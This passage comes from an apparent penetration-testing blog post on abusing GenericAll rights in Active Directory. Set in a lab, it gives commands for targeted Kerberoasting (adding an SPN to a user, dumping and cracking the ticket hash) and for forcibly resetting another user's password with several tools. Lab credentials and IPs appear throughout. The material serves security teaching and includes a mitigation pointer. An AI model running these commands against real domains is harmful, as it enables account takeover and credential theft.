+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrTTp8I8dN9D8-FTpjnRm4BSaJtjAyPagWlTum30C-OzfDpfLLiVvRT9e3F5QWozUo9JeI8tkKGmfE0tUmYfNG9HqpaNUEBBJLMkH3vtNM5lTnXWhlbUNNOpxfwF5kevryrSGgaeEbrxi3Gmsgx0j_7yE4dQtJ3V_OmVI6_jeHjGHYi2DzYxxDqU3T9udT/s16000/60.png" alt="Generic ALL Active Directory Abuse" width="1225" height="515"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./targetedKerberoast.py --dc-ip '192.168.1.8' -v -d 'ignite.local' -u 'nishant' -p 'Password@1'</pre>
+<p><span style="color: #000000">As we have seen during the lab setup, the vipin user was added as a domain user account, which does not have any associated SPN. The Python script has modified the attribute of vipin user to set the SPN name and then dump Krbtgs hash that can be brute-forced offline. Moreover, the script performs a clear track step by removing the SPN well live from the user attribute.</span></p>
+<p><span style="color: #000000">This type of attack is ideally best when the attacker is not willing to change the password for the target user &lt;Vipin in our case&gt;, even generic all privilege is enabled for the compromised user. Yes, this step is less noisy than changing the password of any user.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuw4rr0Fh-2-x08rpCmiW6Uf2wILXs7FEbV3heMsM4fNwf25xv5w4zVe3pk4Pao5uleytJAl7qq_9hwFhpy-ij9e-axCevH0eajzRoiCJ7VuYZfG7pGGR0xQYIvQ_S3yBXKGmVdt0S8sLvoyORes6Yg1HNqTzdRDsK-GTFTZmtwMsZecjdO5sLOvBwsP-7/s16000/61.png"/></span></p>
+<p><span style="color: #000000">Further, with the help of John the Ripper and a dictionary such as Rock You can help the attacker to brute force the weak password.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhp7JZaieo2LPLRvR4O1oIN3EAcQVNqqMEKCfzNZ65gTg6SQ5JxUkmJiYngA26ZA1WBsY08QzbIin4ihr8-dvL3sB2htshiihkFnmIufYJ7sJVgkkG0thGDFSNoTFMuThroopJZZUbiFbzNN_eDlvSM-CHkDy8HwseD2WWAFshQkQfGAX9sUUdVAr4dpJhD/s16000/62.png" alt="Generic ALL Active Directory Abuse" width="919" height="345"/></span></p>
+<h3><span style="color: #800000">1.2 Windows PowerShell Script-PowerView</span></h3>
+<p><span style="color: #000000">To perform Kerberoasting using PowerView on a Windows machine, you can leverage PowerView’s ability to enumerate Active Directory service accounts that have Service Principal Names (SPNs). These SPNs can be requested to obtain service tickets (TGS), which can then be cracked offline to reveal the service account’s credentials. Here’s a brief overview of the steps:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Make sur that the target account has no SPN and then Set the SPN to obtain the KerbTGS hash
+Get-DomainUser 'vipin' | Select serviceprincipalname
+Set-DomainObject -Identity 'vipin' -Set @{serviceprincipalname='nonexistent/hackingarticles'}
+$User = Get-DomainUser 'vipin'
+$User | Get-DomainSPNTicket | f1</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGbm5nVVG3Q34SNI9mijkJ3lgmWRcALyTzodEdV1Ly_DrHZDY15BnqTo8l6EJRam9xBL-bht1BynFqt8fonS6aaIuMSeYOmeHH9Q71fDjz4Wn4DhwlcAz3r2wl_zFerxRJ1OPf0P8lmNMPFDaJhGj3cFrVqzivbDuC0V7F0dkdcpB7lA_VVcO0-DHKMYLF/s16000/63.png"/></span></p>
+<p><span style="color: #000000">Cracking TGS hash using Rockyou.txt with the help of Hashcat Tool.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiv0Nl9zcPKtn2m1NFvLEaIhb8z65GVtThogCoV2Z0xvk4l4ees3cKvWpfn00MYIQQL4HfvtU8oN-OdGgnVsWU_oxYlsdXjHWux9FNmcvTW8cPdhwprstEZAOGHFi1-0wFnZFsFC6wgCCTT8nGM6aZ7b-bMBQQkBduaaLO2vH9z1x7nui97i2NerwHVxAsw/s16000/64.png" alt="Generic ALL Active Directory Abuse" width="1349" height="1451"/></span></p>
+<h4><span style="color: #000000">2.     T1110.001 – Change Password</span></h4>
+<h5><span style="color: #000000"><strong>2.1 </strong><strong>Linux Net RPC – Samba</strong></span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net rpc password vipin 'Password@987' -U ignite.local/nishant%'Password@1' -S 192.168.1.8</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjw_ovYPhWorTzYwQAaRA_ixPheEm5H9ixFtuGk5gkpVXgwLmjTeFeOsG7YW_qT3UOsdrYz273bL3CGgN0br3l8xSfQo2chNbZQtDTZ_cLjLjGWJZGnFMBRHOHDDeREGbndJ1tQrnDJ9vqe0H8Id4KknZI6mni3SF-y-hugGXBrbThTRY7lixwE3rUZx4Fx/s16000/66.png"/></span></p>
+<h5><span style="color: #000000"><strong>2.2 </strong><strong>Linux Net RPC – BloodAD</strong></span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host "192.168.1.8" -d "ignite.local" -u "nishant" -p "Password@1" set password "vipin" "Password@9876"</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTqcMTtTJRvJSIUGGBidzNBzDXc0pZhp9CDtJzGp2HUF2mPTxL4CJRWe0J4xaeoxreelBF-dNbhQovh09lniRFIrDCKz-Cbwnd8MX0B0h3adwr7KhL-jQOX2Cy53EPZ2L8kvi2ulX8yzkcRAF2v433N2i80PWvkGXeh08jO-4gVUDJKylZEgYLGG0FJSgw/s16000/67.png" alt="Generic ALL Active Directory Abuse" width="1828" height="131"/></span></p>
+<h5><span style="color: #000000"><strong>2.3 </strong><strong>Linux Net RPC –Rpcclient</strong></span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rpcclient -U ignite.local/nishant 192.168.1.8
+setuserinfo vipin 23 Ignite@987</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQKO4D7kfaAKLMJ9KKcjltpYdnlMIhFPziuVMiVmswqtFgoxxrI86-dRf1xCZk2ZEE1A4wBHG2zesAgUNrR4kFh74YMdlVQmNJIRxaHSuIFw-m6eyjgAz9_4iZQ_87jhpkHQBZCDvPI63TNclPxydaBeQ_pbt56ZWx0TH9QNkFAizv39xSzmzJb8VXcr7j/s16000/68.png" alt="Generic ALL Active Directory Abuse" width="827" height="137"/></span></p>
+<h5><span style="color: #000000"><strong>2.4 </strong><strong>Windows Net Utility</strong></span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user Vipin Password@1234 /domain</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghZp4FPeo_O_ohM59TI1S7UtQnKaTGpiMNZCzEieLgZe4kE8NJLFSzrlv-ITQ_m428MEvxsGucDFH_fv4aCR1ty5GHuk_MV8hi75B9sKp59llEtKkaQxUZWXoViHVQHK00WahlOKhDR3lwtPoWKSgY5ywuzVPY-DR08OsByxbT1MZ-DiwHfJoSrDS1EN7B/s16000/69.png"/></span></p>
+<h5><span style="color: #000000"><strong>2.5 </strong><strong>Windows PowerShell -Powerview</strong></span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$SecPassword = ConvertTo-SecureString 'Password@987' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('ignite.localvipin', $SecPassword)</pre>
+<p><span style="color: #000000"><strong><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhcTWOWTGauhV7hYo0IUYh9M0pqQbIAVd3n56_bModsGLxz47TckcQ80uw9fDH2io8VInZS61wGFtiunEXVD5J2BiJVAtE-BDnBG5HUBDqHfaoxqJYPumEsO3dRyF_SccjCQpjU_RTHgNc51BEgNg9OFh3scoVA4vTUr49mg9ZpraSr_zTOXVElTlFSq4S/s16000/70.png" alt="Generic ALL Active Directory Abuse" width="1719" height="132"/></strong></span></p>
+<h5><span style="color: #000000"><strong>2.6 </strong><strong>Windows PowerShell</strong></span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity 'vipin' -AccountPassword $NewPassword</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2qapw0MIPqo9T2jfZMP725q0HQMdqqvgbjEDklRK34bb1e3RQho7tSLeafElypIrtFpNGDmNAcNA8KAhnO8P0UKTQ43kULg70Y6s4RbaVShlVoyKUu9CORA81y3SERTgp1eX__qAjbGOn4TVfXBLzP6rvlHV1hn0TR4kn_lpF3Wqwj5w-XxGkEnjVPpcs/s16000/71.png"/></span></p>
+<h3><span style="color: #000000">Reference:</span> <a href="https://www.thehacker.recipes/ad/movement/dacl/">https://www.thehacker.recipes/ad/movement/dacl/</a></h3>
+<h3><span lang="EN-IN" style="color: #800000">Detection &amp; Mitigation</span></h3>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9OCyopgVPjGiBe_-DRRAKu0qnyjS5mgdVGIJ14CHdBCZ-gNylhbIO07bzk4QQ54X4X4p1oyiJgn4WR61IX4RUCN1VKSo8ZIuAxkKn1J-2NstsFXnzN18n7GbPqHs4nwAZimVlYJIJPDG3_e_k607ZgpINB_iRPDYDTcIKQE9O65FwowqsOM3TepYwApFG/s16000/Detection%20&amp;%20Mitigation%20Attack%20MITRE%20ATT&amp;CK%20Technique%20Description%20Detection%20Mitigation%20Reset%20Password%20T1110.001%20%E2%80%93%20Password%20Cracking%20Attackers%20with%20Generic%20ALL%20permissions%20can%20reset%20the%20target%20user%E2%80%99%20(1).png" alt="Generic ALL Active Directory Abuse" width="3005" height="4250"/></p>
+<p><span style="color: #000000"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><strong><a href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
